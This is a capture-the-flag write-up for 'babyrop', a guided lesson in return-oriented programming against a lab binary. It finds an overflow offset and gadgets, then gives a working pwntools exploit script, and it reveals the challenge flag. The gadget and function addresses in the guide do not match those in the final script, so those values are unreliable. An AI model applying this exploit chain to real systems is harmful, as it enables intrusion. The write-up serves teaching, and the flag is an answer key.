# Challenge Name
babyrop

## Learning Objective
Learn Return Oriented Programming (ROP).

## Description 
ROOOOOOOOOOPPERS. Tell me the gadgets used as your flag. ex. if rax and rbx are used, then put as `MACCTF{raxrbx}`

## Difficulty:
guided (easy)

## Guide
Looking at the code, we have to use ret2win again for the uncalled `win` function. However, we have to fulfil the function arguments in order to call it.
1. a = 0x1337
2. b = 0xdead

We will instead do something called **Return Oriented Programming (ROP)**. ROP essentially uses the existing instructions/pieces of code in the program to help us craft our own payload. These pieces of code are also known as **gadgets**.


### Calling conventions

In x64, when a function is called and there are arguments involved, it will look for the registers in this particular order:
1. `rdi` - 1st argument
2. `rsi` - 2nd argument
3. `rdx` - 3rd argument
etc.

In this case, we need to use 2 arguments, so we need to use `rdi` & `rsi` registers.

What we need to find:
1. Offset required to BOF
2. Return address of `win` function
3. Gadgets

### To find the offset needed:
1. Open program with pwndbg
```shell
$> gdb chall
```

2. Generate the cyclic pattern of 100 bytes. This cyclic sequence helps uses to identify what address or how many bytes we want to overwrite.
```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaa...
```

3. Run the program and paste when prompted
```shell
pwndbg> run
``` 

4. You should be able to observe this in the registers:
```shell
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffdc58 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
```

Let's find the offset needed:
```shell
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

### To find the `win` address:
```sh
$> objdump -d chall | grep win
0000000040537 <win>:
...
```

### To find gadgets
For `rdi` register:
```sh
$> ROPgadget --binary chall | grep rdi
0x0000000000400603 : pop rdi ; ret
```

For `rsi` register:
```sh
$> ROPgadget --binary chall | grep rsi
0x0000000000400601 : pop rsi ; pop r15 ; ret
```

We can see that the `rsi` gadget has `pop r15` as well. We do not need this for the exploit but we have to fill it up with a redundant value so that it does not affect our ROP chain.

### Assembling our exploit
Before we return to the `win` function, we want to prepare the registers first so that the function will take argument values from the registers accordingly. This will be with the use of gadgets

Essentially, when you return to the gadget's address:
```shell
0x0000000000400603 : pop rdi ; ret
```

It will:
1. pop an address/value off the stack
2. return to the next address

So our plan is to get the gadget to:
1. pop a value **we want**
2. return to the **next gadget address/win address**

Based on that, we can assemble the following:

1. padding
2. pop rdi address + argument 1 (rdi)
3. pop rsi address + argument 2 (rsi) + redundent value (r15)
4. return address of `win` fcuntioon

### Final solution
```py
from pwn import *

# setup process
p = remote("IP", PORT)

# address of win function
win_addr = p64(0x400757)

# ROP gadget addresses
rdi_addr = p64(0x4008e3)
rsi_addr = p64(0x4008e1)

# payload = 
# padding
# pop rdi + argument 1
# pop rsi + argument 2 + pop r15 (we dont need r15)
# return to win

payload = b'A' * 40
payload += rdi_addr + p64(0x1337)
payload += rsi_addr + p64(0xdead) + p64(0)
payload += win_addr 

# send payload
p.sendline(payload)
p.interactive()
```

## Solution
Refer to solve.py

## Hints
1. x64 function calling convention
2. Ever heard of ROPgadgets/ropper/rp++?
3. Consider the order of your ROP chain. (What must go in first?)

## Attached Files
- chall.c
- chall

## Resources
- https://ctf101.org/binary-exploitation/what-are-calling-conventions/
- https://ctf101.org/binary-exploitation/return-oriented-programming/
- https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html


## Flag
`MACCTF{rdirsi}`